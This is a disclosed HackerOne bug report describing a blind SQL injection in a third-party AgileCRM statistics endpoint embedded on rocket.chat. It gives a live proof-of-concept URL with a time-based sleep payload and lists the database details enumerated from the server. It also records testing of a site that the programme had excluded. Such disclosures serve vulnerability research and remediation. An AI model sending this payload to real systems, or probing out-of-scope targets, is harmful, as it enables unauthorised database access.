---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '433792'
original_report_id: '433792'
title: Blind SQL injection in third-party software, that allows to reveal user statistic
  from rocket.chat and possibly hack into the rocketchat.agilecrm.com
weakness: SQL Injection
team_handle: rocket_chat
created_at: '2018-11-03T15:23:26.805Z'
disclosed_at: '2019-10-17T17:34:31.225Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 60
tags:
- hackerone
- sql-injection
---

# Blind SQL injection in third-party software, that allows to reveal user statistic from rocket.chat and possibly hack into the rocketchat.agilecrm.com

## Metadata

- HackerOne Report ID: 433792
- Weakness: SQL Injection
- Program: rocket_chat
- Disclosed At: 2019-10-17T17:34:31.225Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi. I decided to go to static website https://rocket.chat/ and look what is there. I found third-party website request `https://stats2.agilecrm.com/addstats?callback=json9064172181954295&guid=5d659e65-2870-63d3-eff0-654315dd3b91&sid=515241ff-64f3-5589-f595-bf1bcccc56f9&url=https%3A%2F%2Frocket.chat%2F&agile=8pat9ou8gh0thqd8dlgctje3go&domain=dorgam` that loading on the main page. After "lite" parameters fussing I found out that parameter "new" is vulnerable to Blind SQL injection vulnerability.
**PoC:**
https://stats2.agilecrm.com/addstats?callback=json949659033379064&guid=f0d3738c-44c0-60a6-44b6-56e14ca30872&sid=2172c2ca-15b6-49c8-052d-b7d817cd280b&url=https%3A%2F%2Frocket.chat%2F&agile=8pat9ou8gh0thqd8dlgctje3go&new=(select*from(select(sleep(5)))a)&ref=&domain=dorgam

**Result:**
5 seconds of loading.

To show the vulnerability threat I decided to exploit it a bit:

Database version: MySQL 5.0.12
Server hostname: localhost
Databases: information_schema; mysql; performance_schema; stats
Stats: 3; persons; map.

## Suggested mitigation

Try to contact agilecrm support / developers and tell them about vulnerability and fix needing.

P.S: I know that on BB main page you letting researchers know about exclusions:
`Exclusions
While researching, we'd like to ask you to refrain from:
Static website (https://rocket.chat)`
But because of vulnerability severity I think I must let you know anyway.

## Impact

Vuln allows to reveal user statistic information from rocket.chat and possibly hack into rocketchat.agilecrm.com (if attacker decided to go deeper).

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
